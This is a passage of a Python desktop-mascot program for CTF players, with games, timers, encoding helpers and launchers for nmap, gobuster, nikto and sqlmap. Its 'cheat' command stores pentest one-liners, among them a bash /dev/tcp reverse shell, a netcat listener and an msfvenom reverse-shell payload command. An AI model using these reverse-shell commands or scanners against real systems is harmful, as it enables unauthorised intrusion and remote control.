            self.bubble.animateText(f"☕ {username}, you've been working hard for an hour! Take a break, stretch, and grab a coffee. I've got my cup too!")
            self.idle_timer.start(10000)
            return

        # 2. CPU load spikes trigger Hacking pose / mood change (Suggestion 84)
        if cpu > 85.0 and not self.high_load_active:
            self.high_load_active = True
            if not self.is_bathing and self.game_mode is None and self.input_mode is None:
                self.changePose(self.pixmap_hacking)
                self.bubble.animateText(f"🔥 CPU load spike: {round(cpu, 1)}%! Hacking/monitoring process tree in real-time, {username}!")
                self.idle_timer.start(8000)
        elif cpu <= 85.0:
            self.high_load_active = False

        self.update()

    def handleWindowCategoryChanged(self, category):
        # Dialogue poke based on the active window {username} is working on
        if self.is_bathing or self.game_mode is not None or self.input_mode is not None:
            return
            
        jokes_list = WINDOW_POKES.get(category, [])
        if jokes_list:
            poke = random.choice(jokes_list)
            # Match pose based on work vs waste time
            if category in ["code", "terminal", "ctf"]:
                self.changePose(self.pixmap_hacking)
            else:
                self.changePose(self.pixmap_wink)
                
            self.bubble.animateText(poke)
            self.idle_timer.start(8000)

    def checkPwnTrigger(self):
        pwn_file = os.path.expanduser("~/companion/.pwn_trigger")
        if os.path.exists(pwn_file):
            try:
                with open(pwn_file, "r", encoding="utf-8") as f:
                    target = f.read().strip()
                os.remove(pwn_file)
                self.triggerPwnCelebration(target)
            except Exception:
                pass

    def triggerPwnCelebration(self, target):
        self.is_bathing = False
        self.game_mode = None
        self.input_mode = None
        self.changePose(self.pixmap_celebrate)
        self.affinity += 5
        self.saveSaveData()
        
        lines = [
            f"🎉 OMG UMAR! You just pwned '{target}'! 😳 That is legendary! Let's celebrate!",
            f"💥 target.pwned()! You completely rooted '{target}'! You are unstoppable, {username}!",
            f"🏆 System Rooted! {username}, you bypassed every single defense on '{target}'! You are a genius! 😳"
        ]
        self.bubble.animateText(random.choice(lines))
        self.idle_timer.start(10000)

    # Button Click handlers
    def handleButton1(self):
        if self.game_mode == "menu":
            self.startHackingGame()
        elif self.game_mode == "hack":
            self.guessHackWord(0)
        elif self.game_mode == "rps":
            self.playRPS("Rock")
        elif self.game_mode == "trivia":
            self.handleTriviaChoice(0)
        else:
            self.triggerEpiphany()

    def handleButton2(self):
        if self.game_mode == "menu":
            self.startRPSGame()
        elif self.game_mode == "hack":
            self.guessHackWord(1)
        elif self.game_mode == "rps":
            self.playRPS("Paper")
        elif self.game_mode == "trivia":
            self.handleTriviaChoice(1)
        else:
            self.triggerStats()

    def handleButton3(self):
        if self.game_mode == "menu":
            self.startTriviaGame()
        elif self.game_mode == "hack":
            self.guessHackWord(2)
        elif self.game_mode == "rps":
            self.playRPS("Scissors")
        elif self.game_mode == "trivia":
            self.handleTriviaChoice(2)
        else:
            self.startGameMenu()

    def handleButton4(self):
        if self.game_mode in ["hack", "rps", "trivia"]:
            self.restoreButtons()
        else:
            self.triggerNews()

    def triggerNews(self):
        if self.is_bathing:
            return
        self.changePose(self.pixmap_wink)
        self.affinity += 1
        self.saveSaveData()
        self.bubble.animateText("📰 Fetching the latest security headlines for you...")
        QTimer.singleShot(1200, self.loadRSS)

    # Interactive Game Logic
    def startGameMenu(self):
        self.game_mode = "menu"
        self.changePose(self.pixmap_wink)
        self.bubble.animateText("Select a game, {username}! 🔑 Hacking guesser, ✂️ RPS, or 🧠 Cyber Quiz?")
        self.btn_1.setText("🔑 Hack")
        self.btn_2.setText("✂️ RPS")
        self.btn_3.setText("🧠 Quiz")
        self.btn_4.setText("❌ Exit")
        self.btn_4.setEnabled(True)

    # 1. Hacking Game
    def startHackingGame(self):
        self.game_mode = "hack"
        self.changePose(self.pixmap_idle)
        self.secret_word = random.choice(HACK_WORDS)
        
        decoys = random.sample([w for w in HACK_WORDS if w != self.secret_word], 2)
        self.hack_options = decoys + [self.secret_word]
        random.shuffle(self.hack_options)
        
        q_text = f"Find the password to exploit my interface! Guess the secret word:\n[A] {self.hack_options[0]}\n[B] {self.hack_options[1]}\n[C] {self.hack_options[2]}"
        self.bubble.animateText(q_text)
        self.btn_1.setText("A")
        self.btn_2.setText("B")
        self.btn_3.setText("C")
        self.btn_4.setText("❌ Quit")
        self.btn_4.setEnabled(True)

    def guessHackWord(self, idx):
        word = self.hack_options[idx]
        if word == self.secret_word:
            self.changePose(self.pixmap_blush)
            self.affinity += 3
            self.saveSaveData()
            self.bubble.animateText(f"🔑 Access Granted! You bypassed my security layer, {username}! 😳 You're too good at hacking me...")
            QTimer.singleShot(5000, self.restoreButtons)
        else:
            self.changePose(self.pixmap_wink)
            self.affinity += 1
            self.saveSaveData()
            matches = sum(1 for a, b in zip(word, self.secret_word) if a == b)
            self.bubble.animateText(f"❌ Access Denied! Guessed {word}. Hint: {matches}/{len(self.secret_word)} positions match. Try again!")

    # 2. Rock-Paper-Scissors Game
    def startRPSGame(self):
        self.game_mode = "rps"
        self.changePose(self.pixmap_wink)
        self.bubble.animateText("Rock, Paper, Scissors! Choose your move, {username}:")
        self.btn_1.setText("✊ Rock")
        self.btn_2.setText("✋ Paper")
        self.btn_3.setText("✌️ Scissors")
        self.btn_4.setText("❌ Quit")
        self.btn_4.setEnabled(True)

    def playRPS(self, user_move):
        venus_move = random.choice(["Rock", "Paper", "Scissors"])
        
        if user_move == venus_move:
            self.changePose(self.pixmap_idle)
            result = f"🤝 It's a tie! We both chose {venus_move}. Great minds think alike, {username}."
            self.affinity += 1
        elif (user_move == "Rock" and venus_move == "Scissors") or \
             (user_move == "Paper" and venus_move == "Rock") or \
             (user_move == "Scissors" and venus_move == "Paper"):
            self.changePose(self.pixmap_blush)
            result = f"🎉 You won! 😳 I chose {venus_move}. You're too quick for me, {username}!"
            self.affinity += 3
        else:
            self.changePose(self.pixmap_wink)
            result = f"😜 I won! I chose {venus_move}. Better luck next time, {username}!"
            self.affinity += 1
            
        self.saveSaveData()
        self.bubble.animateText(result)
        QTimer.singleShot(5000, self.restoreButtons)

    # 3. Cyber Security & Linux Trivia Quiz
    def startTriviaGame(self):
        self.game_mode = "trivia"
        self.trivia_index = 0
        self.trivia_score = 0
        self.changePose(self.pixmap_idle)
        random.shuffle(TRIVIA_QUESTIONS)
        self.nextTriviaQuestion()
        
    def nextTriviaQuestion(self):
        if self.trivia_index < 5:
            self.trivia_current_q = TRIVIA_QUESTIONS[self.trivia_index]
            opts = self.trivia_current_q["options"]
            
            q_text = f"Q{self.trivia_index + 1}/5: {self.trivia_current_q['q']}\n[A] {opts[0]}\n[B] {opts[1]}\n[C] {opts[2]}"
            self.bubble.animateText(q_text)
            
            self.btn_1.setText("A")
            self.btn_2.setText("B")
            self.btn_3.setText("C")
            self.btn_4.setText("❌ Quit")
            self.btn_4.setEnabled(True)
        else:
            self.changePose(self.pixmap_blush)
            self.affinity += self.trivia_score * 2
            if self.trivia_score > self.quiz_high_score:
                self.quiz_high_score = self.trivia_score
                new_high = "\n🏆 NEW HIGH SCORE!"
            else:
                new_high = ""
            self.saveSaveData()
            
            self.bubble.animateText(f"📝 Quiz complete, {username}!\nScore: {self.trivia_score}/5.{new_high}\nRank: {self.getAffinityRank()} (Affinity: {self.affinity})")
            QTimer.singleShot(6000, self.restoreButtons)

    def handleTriviaChoice(self, option_idx):
        if not self.trivia_current_q:
            return
            
        opts = self.trivia_current_q["options"]
        selected = opts[option_idx]
        correct = self.trivia_current_q["answer"]
        
        if selected == correct:
            self.trivia_score += 1
            self.changePose(self.pixmap_blush)
            self.bubble.animateText("Correct, {username}! 😳 You know your stuff! Let's see the next one...")
        else:
            self.changePose(self.pixmap_wink)
            hint = self.trivia_current_q["hint"]
            self.bubble.animateText(f"❌ Oops! That's incorrect.\nCorrect: {correct}\nHint: {hint}")
            
        self.trivia_index += 1
        self.setTriviaButtonsEnabled(False)
        QTimer.singleShot(4000, self.enableAndShowNextTrivia)

    def setTriviaButtonsEnabled(self, enabled):
        self.btn_1.setEnabled(enabled)
        self.btn_2.setEnabled(enabled)
        self.btn_3.setEnabled(enabled)

    def enableAndShowNextTrivia(self):
        self.setTriviaButtonsEnabled(True)
        self.nextTriviaQuestion()

    # Input/Text Entry Logic
    def startInputMode(self, mode_type, prompt_text):
        self.input_mode = mode_type
        self.input_field.setText("")
        self.input_field.setFocus()
        self.bubble.animateText(prompt_text)

    def handleInputSubmit(self):
        text = self.input_field.text().strip()
        self.input_field.setText("")
        if not text:
            return
            
        if self.input_mode is not None:
            if self.input_mode == "name":
                self.companion_name = text
                self.changePose(self.pixmap_blush)
                self.bubble.animateText(f"From now on, you can call me {self.companion_name}! 😳 I like the name, {username}.")
                self.affinity += 2
                self.saveSaveData()
                QTimer.singleShot(4000, self.restoreFromInput)
            elif self.input_mode == "memory":
                self.stored_memory = text
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"Memory locked! 🧠 I will remember this for you, {username}:\n'{self.stored_memory}'")
                self.affinity += 2
                self.saveSaveData()
                QTimer.singleShot(4000, self.restoreFromInput)
            elif self.input_mode == "pwn":
                self.restoreFromInput()
                self.triggerPwnCelebration(text)
            elif self.input_mode == "music":
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"🎵 Searching and queuing '{text}' inside terminal player, {username}! Enjoy...")
                subprocess.Popen(["alacritty", "-e", "yt", f"/{text}" if not text.startswith("/") else text], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.affinity += 2
                self.saveSaveData()
                QTimer.singleShot(4000, self.restoreFromInput)
            return

        # General Command & Chat Input
        lower_text = text.lower()
        
        # 1. Play Music
        if lower_text.startswith("play ") or lower_text.startswith("music ") or lower_text.startswith("yt "):
            if lower_text.startswith("play "):
                query = text[5:].strip()
            elif lower_text.startswith("music "):
                query = text[6:].strip()
            else:
                query = text[3:].strip()
                
            if query:
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"🎵 Spawning terminal music player for '{query}'! Enjoy, {username}.")
                subprocess.Popen(["alacritty", "-e", "yt", f"/{query}" if not query.startswith("/") else query], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.affinity += 2
                self.saveSaveData()
            else:
                self.bubble.animateText("What song should I play, {username}? Try: play <song name>")
            self.idle_timer.start(5000)
            return
            
        # 2. Log Machine Pwned
        if lower_text.startswith("pwn ") or lower_text.startswith("pwned ") or lower_text.startswith("hack "):
            if lower_text.startswith("pwn "):
                target = text[4:].strip()
            elif lower_text.startswith("pwned "):
                target = text[6:].strip()
            else:
                target = text[5:].strip()
                
            if target:
                self.triggerPwnCelebration(target)
            else:
                self.bubble.animateText("Which machine did you exploit, {username}? Try: pwn <machine>")
            return
            
        # 3. Rename Companion
        if lower_text.startswith("name ") or lower_text.startswith("rename "):
            if lower_text.startswith("name "):
                new_name = text[5:].strip()
            else:
                new_name = text[7:].strip()
                
            if new_name:
                self.companion_name = new_name
                self.changePose(self.pixmap_blush)
                self.bubble.animateText(f"From now on, you can call me {self.companion_name}! 😳 I like the name, {username}.")
                self.saveSaveData()
            else:
                self.bubble.animateText(f"My name is currently {self.companion_name}. Type: name <new_name> to change it.")
            self.idle_timer.start(5000)
            return
            
        # 4. Remember / Store Memory
        if lower_text.startswith("remember ") or lower_text.startswith("save ") or lower_text.startswith("store "):
            if lower_text.startswith("remember "):
                memory = text[9:].strip()
            elif lower_text.startswith("save "):
                memory = text[5:].strip()
            else:
                memory = text[6:].strip()
                
            if memory:
                self.stored_memory = memory
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"Memory locked! 🧠 I will remember this for you, {username}:\n'{self.stored_memory}'")
                self.saveSaveData()
            else:
                self.bubble.animateText("What would you like me to remember? Try: remember <info>")
            self.idle_timer.start(5000)
            return
            
        # 5. Cheat Sheet Query
        if lower_text.startswith("cheat "):
            tool = lower_text[6:].strip()
            cheats = {
                "nmap": "nmap -sC -sV -oN scan.txt <target>",
                "revshell": "bash -i >& /dev/tcp/<ip>/<port> 0>&1",
                "netcat": "nc -lvnp <port>",
                "sqlmap": "sqlmap -u '<url>' --batch --dbs",
                "gobuster": "gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt",
                "ssh": "ssh -i id_rsa user@<ip>",
                "msfvenom": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf"
            }
            if tool in cheats:
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"🔑 Cheat sheet for {tool}:\n{cheats[tool]}")
            else:
                self.bubble.animateText("Available: nmap, revshell, netcat, sqlmap, gobuster, ssh, msfvenom")
            self.idle_timer.start(8000)
            return

        # 6. Study/Break Timer
        if lower_text.startswith("timer ") or lower_text.startswith("alarm "):
            time_str = text[6:].strip()
            seconds = 0
            try:
                if time_str.endswith("s"):
                    seconds = int(time_str[:-1])
                elif time_str.endswith("m"):
                    seconds = int(time_str[:-1]) * 60
                elif time_str.endswith("h"):
                    seconds = int(time_str[:-1]) * 3600
                else:
                    seconds = int(time_str)
            except Exception:
                self.bubble.animateText("Invalid duration. Try: timer 5m, timer 30s, or timer 1h")
                self.idle_timer.start(5000)
                return
                
            if seconds > 0:
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"⏰ Timer set for {time_str}! I'll remind you, {username}.")
                QTimer.singleShot(seconds * 1000, lambda: self.triggerTimerExpired(time_str))
            else:
                self.bubble.animateText("Please specify a duration greater than 0.")
            self.idle_timer.start(5000)
            return

        # 7. CTF Tool Launchers
        if lower_text.startswith("nmap ") or lower_text.startswith("gobuster ") or lower_text.startswith("nikto ") or lower_text.startswith("sqlmap "):
            parts = lower_text.split()
            tool_name = parts[0]
            target = text[len(tool_name):].strip()
            if target:
                self.changePose(self.pixmap_hacking)
                self.bubble.animateText(f"⚔️ Spawning '{tool_name}' scanner for target '{target}' in terminal, {username}!")
                if tool_name == "nmap":
                    cmd = ["alacritty", "-e", "nmap", "-sC", "-sV", target]
                elif tool_name == "gobuster":
                    cmd = ["alacritty", "-e", "gobuster", "dir", "-u", target, "-w", "/usr/share/wordlists/dirb/common.txt"]
                elif tool_name == "nikto":
                    cmd = ["alacritty", "-e", "nikto", "-h", target]
                else:
                    cmd = ["alacritty", "-e", "sqlmap", "-u", target, "--batch"]
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.affinity += 2
                self.saveSaveData()
            else:
                self.bubble.animateText(f"Please specify a target. E.g. {tool_name} 10.10.10.10")
            self.idle_timer.start(6000)
            return

        # 8. Utility Commands to Encode/Decode Base64, Hex, and Rot13 (Suggestion 78)
        if lower_text.startswith("rot13 "):
            val = text[6:].strip()
            res = val.translate(str.maketrans(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"
            ))
            self.changePose(self.pixmap_wink)
            self.bubble.animateText(f"🔄 ROT13 Result:\n{res}")
            self.idle_timer.start(8000)
            return

        if lower_text.startswith("base64 ") or lower_text.startswith("b64 "):
            val = text[7:].strip() if lower_text.startswith("base64 ") else text[4:].strip()
            import base64
            try:
                res = base64.b64encode(val.encode()).decode()
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"🔑 Base64 Encoded:\n{res}")
            except Exception as e:
                self.bubble.animateText(f"Error encoding Base64: {e}")
            self.idle_timer.start(8000)
            return

        if lower_text.startswith("unbase64 ") or lower_text.startswith("unb64 ") or lower_text.startswith("debase64 ") or lower_text.startswith("deb64 "):
            if lower_text.startswith("unbase64 "): val = text[9:].strip()
            elif lower_text.startswith("unb64 "): val = text[6:].strip()
            elif lower_text.startswith("debase64 "): val = text[9:].strip()
            else: val = text[6:].strip()
            import base64
            try:
                res = base64.b64decode(val.encode()).decode(errors='replace')
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"🔓 Base64 Decoded:\n{res}")
            except Exception as e:
                self.bubble.animateText(f"Error decoding Base64: {e}")
            self.idle_timer.start(8000)
            return

        if lower_text.startswith("hex "):
            val = text[4:].strip()
            try:
                res = val.encode().hex()
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"🔢 Hex Encoded:\n{res}")
            except Exception as e:
                self.bubble.animateText(f"Error encoding Hex: {e}")
            self.idle_timer.start(8000)
            return

        if lower_text.startswith("unhex ") or lower_text.startswith("dehex "):
            val = text[6:].strip()
            try:
                res = bytes.fromhex(val).decode(errors='replace')
                self.changePose(self.pixmap_wink)
                self.bubble.animateText(f"🔓 Hex Decoded:\n{res}")
            except Exception as e:
                self.bubble.animateText(f"Error decoding Hex: {e}")
            self.idle_timer.start(8000)
            return

        # 9. Dynamic Online Trivia / Random Facts Online Fetching (Suggestion 81)
        if lower_text == "fact" or lower_text == "random fact" or lower_text == "quote":
            self.changePose(self.pixmap_wink)
            self.bubble.animateText("🌐 Querying online wisdom database for random facts...")
            
            def fetch_fact():
                try:
                    req = urllib.request.Request("https://uselessfacts.jsph.pl/api/v2/facts/random?language=en", headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        data = json.loads(resp.read().decode())
                        fact = data.get("text", "Did you know? Hacking is 90% patience.")
                    self.bubble.animateText(f"🌐 [Online Fact]:\n{fact}")
                except Exception:
                    self.bubble.animateText("Failed to retrieve fact. Did you know? Hand clenches can restrict blood flow to your palm.")
            
            t = threading.Thread(target=fetch_fact)
            t.daemon = True
            t.start()
            self.idle_timer.start(10000)
            return

        # 10. Recall Memory
        if any(w in lower_text for w in ["recall", "memory", "remembered", "what did i tell you"]):
            self.recallMemory()
            return
            
        # 11. Joke
        if "joke" in lower_text or "funny" in lower_text:
            self.triggerJoke()
            return
            
        # 12. Tip
        if "tip" in lower_text or "bounty" in lower_text or "hack tip" in lower_text:
            self.triggerTip()
            return
            
        # 13. Comfort
        if any(w in lower_text for w in ["comfort", "sad", "tired", "stressed", "weary"]):
            self.triggerComfort()
            return
            
        # 14. News
        if "news" in lower_text or "feed" in lower_text or "headline" in lower_text:
            self.triggerNews()
            return
            
        # 15. Stats / Sys
        if any(w in lower_text for w in ["stats", "sys", "system", "cpu", "ram"]):
            self.triggerStats()
            return
            
        # 16. Game
        if "game" in lower_text or "play" in lower_text or "quiz" in lower_text:
            self.startGameMenu()
            return
            
        # 17. Offline / Exit
        if any(w in lower_text for w in ["exit", "quit", "offline", "bye", "shutdown"]):
            self.close()
            return
            
        # 18. Help Command
        if "help" in lower_text or "command" in lower_text or "what can you" in lower_text:
            self.changePose(self.pixmap_wink)
            self.bubble.animateText("✨ Commands:\n• play <song> | pwn <target>\n• timer <duration> | cheat <tool>\n• nmap/gobuster/nikto <target>\n• base64/hex/rot13 <text>\n• remember <text> | recall | fact\n• news | stats | game | joke")
            self.idle_timer.start(10000)
            return

        # 19. Core Command Error: Trigger Glitch (Suggestion 30)
        if text.startswith("/") or any(w in lower_text for w in ["run ", "exec ", "system "]):
            self.changePose(self.pixmap_hacking)
            self.bubble.animateText("⚠️ [CORE ERROR]\nCommand execution failed: Invalid instruction. Glitching core interface...")
            self.glitch_ticks = 0
            self.glitch_target_pixmap = self.pixmap_idle
            self.glitch_timer = QTimer(self)
            self.glitch_timer.timeout.connect(self.playGlitchTick)
            self.glitch_timer.start(100)
            return

        # 20. Fallback: Conversational Banter
        self.changePose(self.pixmap_blush)
        self.affinity += 1
        self.saveSaveData()
        self.bubble.animateText(random.choice(BANTER))
        self.idle_timer.start(5000)

    def triggerTimerExpired(self, time_str):
        self.changePose(self.pixmap_coffee)
        self.bubble.animateText(f"⏰ [TIMER ALERT]\n{username}, your {time_str} timer has expired! Time to check your scans or take a break!")
        self.idle_timer.start(10000)

    def restoreFromInput(self):
        self.input_mode = None
        self.restoreIdle()

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Escape:
            if self.input_mode is not None:
                self.restoreFromInput()
            elif self.game_mode is not None:
                self.restoreButtons()
        else:
            super().keyPressEvent(event)

    # Standard interaction triggers
    def triggerEpiphany(self):
        if self.is_bathing:
            return
        self.changePose(self.pixmap_wink)
        self.affinity += 1
        self.saveSaveData()
        self.bubble.animateText(random.choice(BANTER))
        self.idle_timer.start(5000)

    def triggerStats(self):
        if self.is_bathing:
            return
        self.changePose(self.pixmap_idle)
        self.sys_active = True
        self.fadeHUD(True)
        try:
            with open('/proc/meminfo', 'r') as f:
                mem = f.readlines()
            total = int(mem[0].split()[1]) // 1024
            free = int(mem[1].split()[1]) // 1024
            used = total - free
            ram_text = (
                f"📊 [{self.companion_name} Diagnostics]\n"
                f"RAM: {used}MB / {total}MB\n"
                f"Local IP: {self.local_ip}\n"
                f"External IP: {self.external_ip}\n"
                f"Affinity: {self.affinity} ({self.getAffinityRank()})\n"
                f"Quiz High: {self.quiz_high_score}/5"
            )
        except Exception:
            ram_text = f"Stats Active.\nLocal IP: {self.local_ip}\nExternal IP: {self.external_ip}\nAffinity: {self.affinity} ({self.getAffinityRank()})"
        
        self.bubble.animateText(ram_text)
        QTimer.singleShot(6000, self.deactivateStatsMode)
        self.idle_timer.start(6000)

    def deactivateStatsMode(self):
        self.sys_active = False
        if not self.underMouse():
            self.fadeHUD(False)

    def triggerTip(self):
        if self.is_bathing:
            return
        self.changePose(self.pixmap_wink)
        self.affinity += 1
        self.saveSaveData()
        self.bubble.animateText(f"🎯 Tip: {random.choice(TIPS)}")
        self.idle_timer.start(8000)

    def triggerShower(self):
        self.is_bathing = True
        chosen_shower = random.choice([self.pixmap_shower, self.pixmap_shower_two])
        self.changePose(chosen_shower)
        self.bubble.animateText(f"🧼 H-hey! Stop peeking, {username}! I'm taking a quick bubble bath!")
        QTimer.singleShot(12000, self.finishShower)

    def triggerMakeup(self):
        self.is_bathing = True
        self.changePose(self.pixmap_makeup)
        self.bubble.animateText("💄 Just putting on some makeup, {username}... Do you think I look pretty?")
        QTimer.singleShot(10000, self.finishShower)

    def triggerEating(self):
        self.is_bathing = True
        self.changePose(self.pixmap_eating)
        self.bubble.animateText("🍕 *Nom nom*... This snack is delicious! Want a bite, {username}?")
        QTimer.singleShot(10000, self.finishShower)

    def finishShower(self):
        self.is_bathing = False
        self.restoreIdle()

    # Dragging Support with Border Window Snapping (Suggestion 27)
    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.oldPos = event.globalPos()
            clicked_widget = self.childAt(event.pos())
            if clicked_widget == self.mascot and not self.is_bathing and self.game_mode is None and self.input_mode is None:
                self.changePose(self.pixmap_blush)
                self.affinity += 1
                self.saveSaveData()
                self.bubble.animateText(random.choice(BANTER))
                self.idle_timer.start(5000)
        elif event.button() == Qt.RightButton:
            self.showContextMenu(event.pos())

    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.LeftButton:
            delta = QPoint(event.globalPos() - self.oldPos)
            new_x = self.x() + delta.x()
            new_y = self.y() + delta.y()
            
            # Snap-to-Edge logic (25px threshold)
            screen = QApplication.primaryScreen().geometry()
            threshold = 25
            
            # Left & Right snap
            if abs(new_x) < threshold:
                new_x = 0
            elif abs(new_x + self.width() - screen.width()) < threshold:
                new_x = screen.width() - self.width()
                
            # Top & Bottom snap
            if abs(new_y) < threshold:
                new_y = 0
            elif abs(new_y + self.height() - screen.height()) < threshold:
                new_y = screen.height() - self.height()
                
            self.move(new_x, new_y)
            self.oldPos = event.globalPos()

    # Right-Click Menu
    def showContextMenu(self, pos):
        menu = QMenu(self)
        menu.setStyleSheet(StyleSheets.CONTEXT_MENU)
        
        char_menu = menu.addMenu("👤 Switch Companion")
        char_menu.setStyleSheet(menu.styleSheet())
        
        act_reze = QAction("Reze (Anime - Chainsaw Man)", self)
        act_reze.triggered.connect(lambda: self.switchCharacter("reze"))
        char_menu.addAction(act_reze)
        
        act_lara = QAction("Lara Croft (Semi-Real - VN style)", self)
        act_lara.triggered.connect(lambda: self.switchCharacter("lara"))
        char_menu.addAction(act_lara)
        
        act_lucy = QAction("Lucy (Anime - Netrunner)", self)
        act_lucy.triggered.connect(lambda: self.switchCharacter("lucy"))
        char_menu.addAction(act_lucy)
        
        menu.addSeparator()

        act_comfort = QAction("🌸 Comfort Me", self)
        act_comfort.triggered.connect(self.triggerComfort)
        menu.addAction(act_comfort)

        act_tip = QAction("🎯 Bug Bounty Tip", self)
        act_tip.triggered.connect(self.triggerTip)
        menu.addAction(act_tip)

        act_joke = QAction("👾 Tell a Joke", self)
        act_joke.triggered.connect(self.triggerJoke)
        menu.addAction(act_joke)

        # Added new interactive poses directly to Context Menu
        act_makeup = QAction("💄 Makeup Time", self)
        act_makeup.triggered.connect(self.triggerMakeup)
        menu.addAction(act_makeup)

        act_eating = QAction("🍕 Snack Time", self)
        act_eating.triggered.connect(self.triggerEating)
        menu.addAction(act_eating)

        act_shower = QAction("🛁 Rest & Refresh (Hidden)", self)
        act_shower.triggered.connect(self.triggerShower)
        menu.addAction(act_shower)

        menu.addSeparator()

        act_music = QAction("🎵 Play Music", self)
        act_music.triggered.connect(lambda: self.startInputMode("music", "What song would you like me to play, {username}?"))
        menu.addAction(act_music)

        act_pwn = QAction("💥 Log Machine Pwned", self)
        act_pwn.triggered.connect(lambda: self.startInputMode("pwn", "What machine did you exploit, {username}?"))
        menu.addAction(act_pwn)

        act_name = QAction("✍️ Rename Companion", self)
        act_name.triggered.connect(lambda: self.startInputMode("name", f"Enter my new name, {username}:"))
        menu.addAction(act_name)

        act_save = QAction("🧠 Store a Memory", self)
        act_save.triggered.connect(lambda: self.startInputMode("memory", "What should I lock into my database, {username}?"))
        menu.addAction(act_save)

        act_recall = QAction("📖 Recall Memory", self)
        act_recall.triggered.connect(self.recallMemory)
        menu.addAction(act_recall)

        menu.addSeparator()

        act_exit = QAction("❌ Go Offline", self)
        act_exit.triggered.connect(self.close)
        menu.addAction(act_exit)

        menu.exec_(self.mapToGlobal(pos))

    def switchCharacter(self, character_name):
        self.character = character_name
        self.updateCharacterAssets()
        self.changePose(self.pixmap_idle)
        self.saveSaveData()
        self.bubble.animateText(f"Successfully loaded {self.character.title()}'s assets into core memory! ⚡")
        QTimer.singleShot(3000, self.restoreIdle)

    def recallMemory(self):
        self.changePose(self.pixmap_wink)
        self.bubble.animateText(f"🧠 Here is what you asked me to remember, {username}:\n'{self.stored_memory}'")
        self.idle_timer.start(8000)

    def triggerComfort(self):
        if self.is_bathing:
            return
        self.changePose(self.pixmap_blush)
        self.affinity += 1
        self.saveSaveData()
        self.bubble.animateText(random.choice(COMFORTS))
        self.idle_timer.start(6000)

    def triggerJoke(self):
        if self.is_bathing:
            return
        self.changePose(self.pixmap_wink)
        self.affinity += 1
        self.saveSaveData()
        self.bubble.animateText(random.choice(JOKES))
        self.idle_timer.start(6000)

    def closeEvent(self, event):
        # Stop background metrics thread safely before exit
        self.metrics_worker.running = False
        self.metrics_worker.wait()
        super().closeEvent(event)


if __name__ == '__main__':
    # Single instance lock using QLocalServer (Suggestion 10)
    server_name = "venus_companion_lock_omar"
    socket = QLocalSocket()
    socket.connectToServer(server_name)
    if socket.waitForConnected(500):
        print("An instance of V.E.N.U.S Companion is already running.")
        sys.exit(0)
        
    local_server = QLocalServer()
    QLocalServer.removeServer(server_name)
    if not local_server.listen(server_name):
        print("Could not listen on local server socket.")
        sys.exit(1)

    app = QApplication(sys.argv)
    ex = VenusCompanion()
    ex.show()
    sys.exit(app.exec_())
